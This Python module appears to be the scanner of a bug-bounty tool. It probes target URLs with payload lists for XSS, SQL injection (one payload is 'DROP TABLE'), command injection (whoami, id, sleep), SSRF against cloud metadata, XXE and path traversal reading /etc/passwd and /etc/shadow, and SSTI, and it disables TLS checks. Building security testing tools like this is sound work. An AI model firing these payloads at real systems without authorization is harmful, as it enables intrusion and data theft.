"""
Scanner Module - Vulnerability detection for XSS, SQLi, IDOR, misconfigs, API issues,
command injection, insecure deserialization, SSRF, XXE, path traversal, SSTI, JWT issues
"""
import re
import time
import base64
import json
import concurrent.futures
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from modules.utils import print_info, print_warning, print_finding

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; BugHunter/1.0)",
    "Accept": "*/*",
}

# ── Payloads ────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "javascript:alert(1)",
    '"><svg onload=alert(1)>',
    "';alert(1)//",
]

SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR '1'='1'--",
    "1' ORDER BY 1--",
    "1 UNION SELECT NULL--",
    "' AND SLEEP(3)--",
    "1; DROP TABLE users--",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "sqlite_", "pg_query",
    "unclosed quotation", "syntax error", "mysql error", "mariadb",
    "you have an error in your sql", "warning: mysql", "postgresql",
    "jdbc", "odbc", "sqlexception",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https:evil.com",
]

# Command Injection payloads — look for timing delays or error output
CMD_INJECTION_PAYLOADS = [
    "; sleep 3",
    "| sleep 3",
    "`sleep 3`",
    "$(sleep 3)",
    "; ping -c 3 127.0.0.1",
    "| whoami",
    "; whoami",
    "$(whoami)",
    "& whoami",
    "| id",
    "; id",
    "\n/bin/ls",
    "|| sleep 3 ||",
]

CMD_INJECTION_ERRORS = [
    "sh:", "bash:", "command not found", "permission denied",
    "root:", "uid=", "gid=", "/bin/", "/usr/", "windows ip",
    "cannot execute", "no such file", "syntax error near",
]

# SSRF payloads — internal/cloud metadata targets
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",          # AWS metadata
    "http://169.254.169.254/latest/meta-data/iam/",      # AWS IAM
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
    "http://169.254.169.254/metadata/v1/",               # DigitalOcean
    "http://192.168.0.1/",                               # Internal network
    "http://10.0.0.1/",
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "file:///etc/passwd",
    "dict://localhost:11211/",                           # Memcached
]

SSRF_PARAMS = [
    "url", "uri", "path", "src", "source", "href", "link",
    "file", "resource", "load", "fetch", "callback", "redirect",
    "return", "image", "img", "proxy", "forward", "host", "webhook",
]

SSRF_INDICATORS = [
    "ami-id", "instance-id", "local-ipv4", "iam",          # AWS
    "computemetadata", "project-id",                        # GCP
    "root:x:0:0", "nobody:x",                              # /etc/passwd
    "metadata", "169.254.169.254",
]

# XXE payloads
XXE_PAYLOADS = [
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""",
    """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><test>&xxe;</test>""",
]

XXE_INDICATORS = [
    "root:x:", "nobody:x:", "daemon:x:",    # /etc/passwd
    "ami-id", "instance-id",                 # AWS metadata
    "localhost", "hostname",
]

# Path Traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
]

PATH_TRAVERSAL_INDICATORS = [
    "root:x:0:0", "nobody:x:", "daemon:",
    "[fonts]", "[extensions]",         # win.ini
    "for 16-bit app support",
]

PATH_TRAVERSAL_PARAMS = [
    "file", "path", "filename", "filepath", "page", "include",
    "doc", "document", "folder", "dir", "directory", "load",
    "read", "view", "template", "name",
]

# SSTI payloads — Server Side Template Injection
SSTI_PAYLOADS = [
    "{{7*7}}",           # Jinja2/Twig — expect 49
    "${7*7}",            # Freemarker/Thymeleaf — expect 49
    "#{7*7}",            # Ruby ERB
    "<%= 7*7 %>",        # ERB
    "{{7*'7'}}",         # Jinja2 vs Twig distinguisher
    "${\"freemarker\".class.forName(\"java.lang.Runtime\")}",
    "{{config}}",        # Flask/Jinja2 config leak
    "{{self}}",
]

SSTI_INDICATORS = ["49", "7777777", "config", "flask", "jinja"]

# Insecure Deserialization indicators (Java, PHP, Python)
DESER_INDICATORS = [
    "java.io.ioexception", "java.lang.classnotfoundexception",
    "unserialize()", "objectinputstream", "readobject",
    "__wakeup", "__destruct", "pickle", "yaml.load",
    "deserializationerror", "serial", "aced0005",  # Java serialization magic bytes
]

# JWT weaknesses
JWT_WEAK_SECRETS = ["secret", "password", "123456", "key", "jwt", "none", ""]

IDOR_PATTERNS = [
    r"/account[s]?/(\d+)",
    r"/profile[s]?/(\d+)",
    r"/order[s]?/(\d+)",
    r"/invoice[s]?/(\d+)",
    r"/document[s]?/(\d+)",
    r"/file[s]?/(\d+)",
    r"/api/v\d+/user[s]?/(\d+)",
    r"\?id=(\d+)",
    r"\?user_id=(\d+)",
    r"\?account_id=(\d+)",
]

SENSITIVE_HEADERS_MISSING = [
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "Referrer-Policy",
    "Permissions-Policy",
]

SENSITIVE_PATHS = [
    "/.env", "/.git/HEAD", "/backup.zip", "/backup.sql",
    "/phpinfo.php", "/.htaccess", "/web.config",
    "/actuator/env", "/actuator/heapdump",
    "/api/swagger.json", "/openapi.json", "/api-docs",
    "/.DS_Store", "/composer.json", "/package.json",
]


class Scanner:
    def __init__(self, recon_data, timeout=10, threads=10, verbose=False):
        self.recon_data = recon_data
        self.timeout = timeout
        self.threads = threads
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        self.findings = []

    def run(self):
        target_url = self.recon_data["target_url"]
        endpoints = self.recon_data.get("endpoints", [])
        live_hosts = self.recon_data.get("live_hosts", [target_url])

        print_info("  [1/10] Checking security headers...")
        self._check_security_headers(live_hosts)

        print_info("  [2/10] Checking for sensitive file exposure...")
        self._check_sensitive_files(live_hosts)

        print_info("  [3/10] Testing for XSS vulnerabilities...")
        self._test_xss(endpoints)

        print_info("  [4/10] Testing for SQL injection...")
        self._test_sqli(endpoints)

        print_info("  [5/10] Testing for IDOR vulnerabilities...")
        self._test_idor(endpoints)

        print_info("  [6/10] Testing for open redirects & CORS...")
        self._test_open_redirect(endpoints)
        self._check_cors(live_hosts)

        print_info("  [7/10] Testing for command injection...")
        self._test_command_injection(endpoints)

        print_info("  [8/10] Testing for SSRF...")
        self._test_ssrf(endpoints)

        print_info("  [9/10] Testing for path traversal & XXE...")
        self._test_path_traversal(endpoints)
        self._test_xxe(endpoints, live_hosts)

        print_info("  [10/10] Testing for SSTI, JWT issues & deserialization...")
        self._test_ssti(endpoints)
        self._test_jwt(live_hosts)
        self._check_deserialization(endpoints, live_hosts)

        return self.findings

    def _add_finding(self, vuln_type, url, severity, description, evidence, remediation):
        finding = {
            "type": vuln_type,
            "url": url,
            "severity": severity,
            "description": description,
            "evidence": evidence,
            "remediation": remediation,
            "confirmed": False,
        }
        self.findings.append(finding)
        print_finding(f"[{severity.upper()}] {vuln_type} at {url}")
        return finding

    def _check_security_headers(self, live_hosts):
        for host in live_hosts[:5]:
            try:
                r = self.session.get(host, timeout=self.timeout)
                missing = [h for h in SENSITIVE_HEADERS_MISSING if h not in r.headers]
                if missing:
                    self._add_finding(
                        vuln_type="Missing Security Headers",
                        url=host,
                        severity="low",
                        description=f"The following security headers are missing: {', '.join(missing)}",
                        evidence=f"Response headers: {dict(r.headers)}",
                        remediation=f"Add the following headers to all responses: {', '.join(missing)}"
                    )

                # Check for verbose server header
                server = r.headers.get("Server", "")
                if re.search(r"\d+\.\d+", server):
                    self._add_finding(
                        vuln_type="Server Version Disclosure",
                        url=host,
                        severity="info",
                        description=f"Server header discloses version information: {server}",
                        evidence=f"Server: {server}",
                        remediation="Configure the server to suppress version information in the Server header."
                    )
            except Exception:
                pass

    def _check_sensitive_files(self, live_hosts):
        def check(args):
            host, path = args
            url = host.rstrip("/") + path
            try:
                r = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                if r.status_code == 200 and len(r.content) > 0:
                    severity = "critical" if path in ["/.env", "/.git/HEAD", "/actuator/heapdump"] else "high"
                    self._add_finding(
                        vuln_type="Sensitive File Exposure",
                        url=url,
                        severity=severity,
                        description=f"Sensitive file accessible at {path}",
                        evidence=f"HTTP {r.status_code}, Content-Length: {len(r.content)}, Preview: {r.text[:200]}",
                        remediation=f"Restrict access to {path} via server configuration or remove the file from the webroot."
                    )
            except Exception:
                pass

        tasks = [(host, path) for host in live_hosts[:3] for path in SENSITIVE_PATHS]
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check, tasks)

    def _get_injectable_urls(self, endpoints):
        """Extract URLs with query parameters to test"""
        injectable = []
        for ep in endpoints:
            url = ep["url"] if isinstance(ep, dict) else ep
            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                injectable.append((url, params))
        return injectable

    def _test_xss(self, endpoints):
        injectable = self._get_injectable_urls(endpoints)
        if not injectable:
            return

        def test(args):
            url, params = args
            parsed = urlparse(url)
            for param in params:
                for payload in XSS_PAYLOADS[:3]:  # Test first 3 payloads
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                    try:
                        r = self.session.get(test_url, timeout=self.timeout)
                        if payload in r.text:
                            self._add_finding(
                                vuln_type="Reflected XSS",
                                url=test_url,
                                severity="high",
                                description=f"Reflected XSS via parameter '{param}'. Payload reflected in response without encoding.",
                                evidence=f"Payload: {payload}\nParameter: {param}\nURL: {test_url}",
                                remediation="Encode all user-supplied input before rendering in HTML. Implement a strict Content-Security-Policy."
                            )
                            return
                    except Exception:
                        pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(test, injectable[:20])  # Limit to 20 URLs

    def _test_sqli(self, endpoints):
        injectable = self._get_injectable_urls(endpoints)
        if not injectable:
            return

        def test(args):
            url, params = args
            parsed = urlparse(url)
            for param in params:
                for payload in SQLI_PAYLOADS[:4]:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                    try:
                        r = self.session.get(test_url, timeout=self.timeout)
                        body_lower = r.text.lower()
                        matched_error = next((e for e in SQLI_ERRORS if e in body_lower), None)
                        if matched_error:
                            self._add_finding(
                                vuln_type="SQL Injection",
                                url=test_url,
                                severity="critical",
                                description=f"Potential SQL injection via parameter '{param}'. Database error leaked in response.",
                                evidence=f"Payload: {payload}\nParameter: {param}\nError pattern: '{matched_error}'\nResponse snippet: {r.text[:300]}",
                                remediation="Use parameterized queries or prepared statements. Never concatenate user input into SQL queries."
                            )
                            return
                    except Exception:
                        pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(test, injectable[:20])

    def _test_idor(self, endpoints):
        """Look for IDOR patterns in discovered endpoints"""
        for ep in endpoints:
            url = ep["url"] if isinstance(ep, dict) else ep
            for pattern in IDOR_PATTERNS:
                match = re.search(pattern, url)
                if match:
                    original_id = match.group(1)
                    # Try incrementing/decrementing the ID
                    for test_id in [str(int(original_id) - 1), str(int(original_id) + 1), "1", "2", "0"]:
                        if test_id == original_id:
                            continue
                        test_url = url.replace(f"/{original_id}", f"/{test_id}").replace(f"={original_id}", f"={test_id}")
                        try:
                            r_original = self.session.get(url, timeout=self.timeout)
                            r_test = self.session.get(test_url, timeout=self.timeout)
                            if (r_test.status_code == 200 and
                                r_original.status_code == 200 and
                                len(r_test.content) > 100 and
                                r_test.text != r_original.text):
                                self._add_finding(
                                    vuln_type="Potential IDOR",
                                    url=test_url,
                                    severity="high",
                                    description=f"Potential IDOR: changing ID from {original_id} to {test_id} returns different valid content without authorization check.",
                                    evidence=f"Original URL: {url} (status {r_original.status_code})\nTest URL: {test_url} (status {r_test.status_code})\nResponse length: {len(r_test.content)} bytes",
                                    remediation="Implement proper authorization checks on all object references. Verify the requesting user owns/has access to the requested resource."
                                )
                                break
                        except Exception:
                            pass

    def _test_open_redirect(self, endpoints):
        redirect_params = ["redirect", "redirect_uri", "next", "url", "return", "return_url", "goto", "target", "dest", "destination"]

        for ep in endpoints:
            url = ep["url"] if isinstance(ep, dict) else ep
            parsed = urlparse(url)
            if not parsed.query:
                continue

            params = parse_qs(parsed.query)
            for param in params:
                if param.lower() in redirect_params:
                    for payload in OPEN_REDIRECT_PAYLOADS:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                        try:
                            r = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                            location = r.headers.get("Location", "")
                            if "evil.com" in location or location.startswith("//"):
                                self._add_finding(
                                    vuln_type="Open Redirect",
                                    url=test_url,
                                    severity="medium",
                                    description=f"Open redirect via parameter '{param}'. User can be redirected to arbitrary external URL.",
                                    evidence=f"Payload: {payload}\nLocation header: {location}",
                                    remediation="Validate redirect URLs against an allowlist of trusted domains. Reject any redirect to external origins."
                                )
                                break
                        except Exception:
                            pass

    def _check_cors(self, live_hosts):
        for host in live_hosts[:3]:
            try:
                headers = {"Origin": "https://evil.com"}
                r = self.session.get(host, headers=headers, timeout=self.timeout)
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")

                if acao == "https://evil.com" or acao == "*":
                    severity = "high" if acac.lower() == "true" else "medium"
                    self._add_finding(
                        vuln_type="CORS Misconfiguration",
                        url=host,
                        severity=severity,
                        description=f"CORS policy reflects arbitrary origin. ACAO: {acao}, ACAC: {acac}",
                        evidence=f"Request Origin: https://evil.com\nAccess-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                        remediation="Do not reflect the Origin header in ACAO. Maintain an explicit allowlist of trusted origins. Never combine ACAO: * with ACAC: true."
                    )
            except Exception:
                pass

    # ── NEW VULNERABILITY CHECKS ────────────────────────────────────────────

    def _test_command_injection(self, endpoints):
        injectable = self._get_injectable_urls(endpoints)
        if not injectable:
            return

        def test(args):
            url, params = args
            parsed = urlparse(url)
            for param in params:
                for payload in CMD_INJECTION_PAYLOADS[:5]:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = test_params[param] + payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                    try:
                        start = time.time()
                        r = self.session.get(test_url, timeout=self.timeout + 5)
                        elapsed = time.time() - start
                        body_lower = r.text.lower()

                        # Time-based detection (sleep payloads)
                        if "sleep" in payload and elapsed >= 3:
                            self._add_finding(
                                vuln_type="Command Injection",
                                url=test_url,
                                severity="critical",
                                description=f"Possible command injection via parameter '{param}'. Time-based detection: response delayed {elapsed:.1f}s with sleep payload.",
                                evidence=f"Payload: {payload}\nParameter: {param}\nResponse time: {elapsed:.1f}s (threshold: 3s)",
                                remediation="Never pass user input to system commands. Use safe APIs instead. If shell execution is required, use an allowlist and proper escaping."
                            )
                            return

                        # Error/output-based detection
                        matched = next((e for e in CMD_INJECTION_ERRORS if e in body_lower), None)
                        if matched:
                            self._add_finding(
                                vuln_type="Command Injection",
                                url=test_url,
                                severity="critical",
                                description=f"Possible command injection via parameter '{param}'. Command output or error detected in response.",
                                evidence=f"Payload: {payload}\nParameter: {param}\nIndicator: '{matched}'\nResponse snippet: {r.text[:300]}",
                                remediation="Never pass user input to system commands. Use safe APIs instead. If shell execution is required, use an allowlist and proper escaping."
                            )
                            return
                    except Exception:
                        pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(test, injectable[:15])

    def _test_ssrf(self, endpoints):
        """Test for Server-Side Request Forgery"""
        injectable = self._get_injectable_urls(endpoints)

        # Also check endpoints that have SSRF-prone parameter names
        for ep in endpoints:
            url = ep["url"] if isinstance(ep, dict) else ep
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param in list(params.keys()):
                if param.lower() in SSRF_PARAMS:
                    for payload in SSRF_PAYLOADS[:4]:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                        try:
                            r = self.session.get(test_url, timeout=self.timeout)
                            body_lower = r.text.lower()
                            matched = next((i for i in SSRF_INDICATORS if i in body_lower), None)
                            if matched:
                                self._add_finding(
                                    vuln_type="Server-Side Request Forgery (SSRF)",
                                    url=test_url,
                                    severity="critical",
                                    description=f"SSRF via parameter '{param}'. Server fetched internal resource and returned its content.",
                                    evidence=f"Payload: {payload}\nParameter: {param}\nIndicator: '{matched}'\nResponse snippet: {r.text[:400]}",
                                    remediation="Validate and allowlist URLs before making server-side requests. Block requests to private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x). Use a DNS resolver to check resolved IPs."
                                )
                                break
                        except Exception:
                            pass

    def _test_path_traversal(self, endpoints):
        """Test for path traversal / directory traversal"""
        injectable = self._get_injectable_urls(endpoints)

        for url, params in injectable[:20]:
            parsed = urlparse(url)
            for param in params:
                if param.lower() in PATH_TRAVERSAL_PARAMS:
                    for payload in PATH_TRAVERSAL_PAYLOADS[:5]:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                        try:
                            r = self.session.get(test_url, timeout=self.timeout)
                            matched = next((i for i in PATH_TRAVERSAL_INDICATORS if i in r.text), None)
                            if matched:
                                self._add_finding(
                                    vuln_type="Path Traversal",
                                    url=test_url,
                                    severity="high",
                                    description=f"Path traversal via parameter '{param}'. Server returned file contents outside the webroot.",
                                    evidence=f"Payload: {payload}\nParameter: {param}\nIndicator: '{matched}'\nResponse snippet: {r.text[:300]}",
                                    remediation="Normalize and canonicalize file paths before use. Validate that the resolved path starts with the intended base directory. Never allow user input to directly control file paths."
                                )
                                break
                        except Exception:
                            pass

    def _test_xxe(self, endpoints, live_hosts):
        """Test for XML External Entity injection on endpoints that accept XML"""
        xml_content_types = ["application/xml", "text/xml", "application/soap+xml"]

        for host in live_hosts[:3]:
            # Look for endpoints that might accept XML (SOAP, REST with XML)
            xml_endpoints = [
                ep["url"] if isinstance(ep, dict) else ep
                for ep in endpoints
                if any(x in (ep["url"] if isinstance(ep, dict) else ep) for x in ["/api", "/soap", "/xml", "/service", "/ws"])
            ]

            for ep_url in xml_endpoints[:10]:
                for payload in XXE_PAYLOADS[:2]:
                    try:
                        r = self.session.post(
                            ep_url,
                            data=payload,
                            headers={**HEADERS, "Content-Type": "application/xml"},
                            timeout=self.timeout
                        )
                        matched = next((i for i in XXE_INDICATORS if i in r.text), None)
                        if matched:
                            self._add_finding(
                                vuln_type="XML External Entity (XXE) Injection",
                                url=ep_url,
                                severity="critical",
                                description="XXE injection detected. Server processed external entity reference and returned file contents.",
                                evidence=f"Payload sent via POST\nIndicator: '{matched}'\nResponse snippet: {r.text[:400]}",
                                remediation="Disable external entity processing in your XML parser. Use a safe XML parsing library configuration. Consider switching to JSON where XML is not required."
                            )
                            break
                    except Exception:
                        pass

    def _test_ssti(self, endpoints):
        """Test for Server-Side Template Injection"""
        injectable = self._get_injectable_urls(endpoints)

        def test(args):
            url, params = args
            parsed = urlparse(url)
            for param in params:
                for payload in SSTI_PAYLOADS[:4]:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                    try:
                        r = self.session.get(test_url, timeout=self.timeout)
                        # Look for evaluated math result (7*7=49)
                        if "49" in r.text and payload in ["{{7*7}}", "${7*7}", "#{7*7}"]:
                            self._add_finding(
                                vuln_type="Server-Side Template Injection (SSTI)",
                                url=test_url,
                                severity="critical",
                                description=f"SSTI detected via parameter '{param}'. Template expression {{{{7*7}}}} evaluated to 49 in server response.",
                                evidence=f"Payload: {payload}\nParameter: {param}\nResponse snippet: {r.text[:300]}",
                                remediation="Never render user-controlled input directly in templates. Use template sandboxing or escape user input before passing it to template engines."
                            )
                            return
                        # Config/object leak
                        if payload == "{{config}}" and ("secret_key" in r.text.lower() or "database" in r.text.lower()):
                            self._add_finding(
                                vuln_type="Server-Side Template Injection (SSTI)",
                                url=test_url,
                                severity="critical",
                                description=f"SSTI config leak via parameter '{param}'. Flask/Jinja2 config object exposed.",
                                evidence=f"Payload: {payload}\nResponse snippet: {r.text[:300]}",
                                remediation="Never render user-controlled input directly in templates. Sandbox template execution."
                            )
                            return
                    except Exception:
                        pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(test, injectable[:15])

    def _test_jwt(self, live_hosts):
        """Check for JWT vulnerabilities in authentication responses"""
        for host in live_hosts[:3]:
            try:
                r = self.session.get(host, timeout=self.timeout)

                # Look for JWT in cookies or response body
                jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
                jwt_tokens = re.findall(jwt_pattern, r.text)
                jwt_cookies = [v for k, v in r.cookies.items() if re.match(jwt_pattern, v)]
                all_tokens = jwt_tokens + jwt_cookies

                for token in all_tokens[:3]:
                    parts = token.split(".")
                    if len(parts) == 3:
                        try:
                            # Decode header (add padding)
                            header_b64 = parts[0] + "=="
                            header = json.loads(base64.urlsafe_b64decode(header_b64).decode())
                            alg = header.get("alg", "")

                            # Check for 'none' algorithm
                            if alg.lower() == "none":
                                self._add_finding(
                                    vuln_type="JWT 'none' Algorithm Vulnerability",
                                    url=host,
                                    severity="critical",
                                    description="JWT token uses 'none' algorithm, meaning the signature is not verified. An attacker can forge tokens.",
                                    evidence=f"JWT header: {header}\nToken prefix: {token[:60]}...",
                                    remediation="Reject JWTs with 'none' algorithm. Explicitly specify and enforce the expected algorithm server-side."
                                )

                            # Decode payload to look for sensitive data
                            payload_b64 = parts[1] + "=="
                            payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode())

                            sensitive_keys = ["password", "secret", "key", "ssn", "credit_card", "admin"]
                            found_sensitive = [k for k in payload if k.lower() in sensitive_keys]
                            if found_sensitive:
                                self._add_finding(
                                    vuln_type="Sensitive Data in JWT Payload",
                                    url=host,
                                    severity="high",
                                    description=f"JWT payload contains potentially sensitive fields: {found_sensitive}. JWT payloads are base64-encoded, not encrypted.",
                                    evidence=f"JWT payload keys: {list(payload.keys())}",
                                    remediation="Never store sensitive data in JWT payloads. JWTs are only signed, not encrypted — the payload is readable by anyone."
                                )
                        except Exception:
                            pass
            except Exception:
                pass

    def _check_deserialization(self, endpoints, live_hosts):
        """Check for insecure deserialization indicators"""
        # Look for serialized object markers in responses and parameters
        deser_param_names = ["object", "data", "payload", "token", "session", "state", "viewstate"]

        injectable = self._get_injectable_urls(endpoints)
        for url, params in injectable[:20]:
            for param in params:
                value = params[param][0] if params[param] else ""

                # Check if existing param values look like serialized objects
                # PHP: O:4:"User" pattern
                if re.search(r'O:\d+:"[A-Za-z]', value):
                    self._add_finding(
                        vuln_type="Insecure Deserialization (PHP)",
                        url=url,
                        severity="critical",
                        description=f"Parameter '{param}' contains a PHP serialized object. If deserialized without validation, this can lead to RCE.",
                        evidence=f"Parameter: {param}\nValue: {value[:200]}",
                        remediation="Never deserialize untrusted data. Use signed/encrypted tokens (HMAC) to ensure data integrity. Prefer JSON over PHP serialization."
                    )

                # Java: base64-encoded serialized objects start with rO0AB
                if value.startswith("rO0AB"):
                    self._add_finding(
                        vuln_type="Insecure Deserialization (Java)",
                        url=url,
                        severity="critical",
                        description=f"Parameter '{param}' appears to contain a base64-encoded Java serialized object (magic bytes rO0AB = 0xACED0005). Could lead to RCE.",
                        evidence=f"Parameter: {param}\nValue prefix: {value[:60]}",
                        remediation="Use serialization filters (Java 9+ ObjectInputFilter). Sign serialized data with HMAC. Consider using JSON instead of Java serialization."
                    )

        # Also scan response bodies for deserialization error indicators
        for host in live_hosts[:3]:
            try:
                r = self.session.get(host, timeout=self.timeout)
                body_lower = r.text.lower()
                matched = next((d for d in DESER_INDICATORS if d in body_lower), None)
                if matched:
                    self._add_finding(
                        vuln_type="Insecure Deserialization (Error Disclosure)",
                        url=host,
                        severity="high",
                        description=f"Deserialization-related error or class reference detected in response: '{matched}'. May indicate unsafe deserialization.",
                        evidence=f"Indicator: '{matched}'\nResponse snippet: {r.text[:300]}",
                        remediation="Suppress detailed error messages in production. Audit all deserialization code paths for untrusted input."
                    )
            except Exception:
                pass
